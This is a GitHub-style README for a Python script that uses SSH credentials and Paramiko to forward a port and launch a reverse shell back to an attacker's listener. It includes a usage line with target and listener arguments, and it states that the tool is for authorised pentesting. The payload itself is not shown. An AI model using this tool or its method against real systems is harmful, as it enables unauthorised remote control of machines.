# Remote SSH Reverse Shell Executor

> ⚠️ **Disclaimer:** This tool is intended for educational and authorized penetration testing purposes only. Unauthorized access to systems is illegal.

## 📌 Description

A Python script to automate SSH port forwarding and trigger a reverse shell on the target machine via Paramiko. It uses SSH credentials to connect to the remote host, sets up port forwarding, and then executes a reverse shell payload.

---

## ✍️ Author

- **Name:** Uday  
- **X (Twitter):** [@udaypro2008](https://x.com/udaypro2008)  
- **GitHub:** [ExtremeUday](https://github.com/ExtremeUday)  
- **HackTheBox:** ExtremeUday2

---

## ⚙️ Features

- SSH login using username & password
- Port forwarding from remote to local (binds to `localhost:2222`)
- Executes reverse shell back to attacker's machine
- Uses `paramiko` for SSH connection and command execution

---

## 📥 Requirements

- Python 3.x
- `paramiko` module
- `sshpass` installed on system

Install Python dependencies:
```bash
pip install paramiko
sudo apt install sshpass
```
---
## 🚀 Usage
```
python3 ssh_reverse_shell.py -ip <TARGET_IP> -user <USERNAME> -passwd <PASSWORD> -lhost <LOCAL_HOST> -lport <LOCAL_PORT>
```
---

## 📡 How it Works

- Sets up port forwarding from target to your machine via SSH.
- Waits 2 seconds to stabilize the connection.
- Connects to the forwarded port (127.0.0.1:2222) via Paramiko.
- Executes a reverse shell payload targeting your listener.

## 🛡️ Legal Notice

- This project is for educational purposes only. Do not use it on any system without explicit permission. The author is not responsible for any misuse or damage caused by this script.

---

## 📂 File Structure
```
.
├── Remote-SSH-Reverse-Shell.py   # Main script
└── README.md                     # Project info
```

